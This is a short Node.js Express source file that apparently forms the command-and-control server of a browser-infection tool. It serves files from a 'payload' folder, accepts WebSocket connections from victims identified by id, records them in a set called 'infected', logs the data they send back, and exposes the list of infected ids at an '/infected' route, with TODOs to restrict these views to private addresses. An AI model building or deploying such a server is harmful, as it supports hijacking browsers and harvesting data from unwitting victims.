const config = require('../config')
const express = require('express')
const express_ws = require('express-ws')
const path = require('path')

const app = express()
express_ws(app)

app.use(config.payloadpath, express.static(path.join(__dirname, '..', 'payload')))

const infected = new Set()
app.ws(config.wspath + '/:id', (ws, wsreq) => {
    console.log(wsreq.params.id)
    infected.add(wsreq.params.id)

    ws.on('message', msg => {
        // TODO write to a file
        console.log(JSON.stringify(msg))
    })

    app.all('/view/:id', (req, res) => {
        // TODO return a specified webpage
        // TODO limit connections to RFC 1918 IPs
        res.end('hi')
    })
})

app.get('/infected', (req, res) => {
    // TODO return a specified webpage
    // TODO limit connections to RFC 1918 IPs
    res.end(JSON.stringify(Array.from(infected.values())))
})

//const port = 8080 // TODO put in config file
app.listen(config.port, () => {
    console.log('Listening on port ' + config.port)
})
